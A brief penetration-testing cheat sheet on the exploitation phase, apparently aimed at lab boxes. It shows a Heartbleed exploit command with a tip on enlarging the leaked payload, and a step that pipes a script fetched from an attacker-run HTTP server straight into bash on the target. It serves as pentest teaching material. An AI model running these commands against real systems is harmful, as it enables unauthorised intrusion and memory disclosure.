# Exploitation

Unlike a vulnerability assessment, a network penetration test takes such a test quite a bit further specifically by way of exploitation. Exploitation involves actually carrying out the vulnerabilityâ€™s exploit (ie: buffer overflow) in an effort to be certain if the vulnerability is truly exploitable. During a RedTeam Security network penetration test, this phase consists of employing heavy manual testing tactics and is often quite time-intensive.

Exploitation may include but is not limited to: buffer overflow, SQL injection, OS commanding and more.


### Heartbleed
```
$ python heartbleed.py -x 10.10.10.125

```
You can change the payload size on line: 116
```
0x40, 0x00  # Payload length
  ^
Change this value to hex value to increase/decrease payload length  
```


### LinEnum.sh
The following tool will allow you to perform enumeration on a box that you do not have root access.

```
HOST MACHINE
$ python -m SimpleHTTPServer

TARGET MACHINE
$ curl 10.10.10.125:8000/LinEnum.sh | bash
```
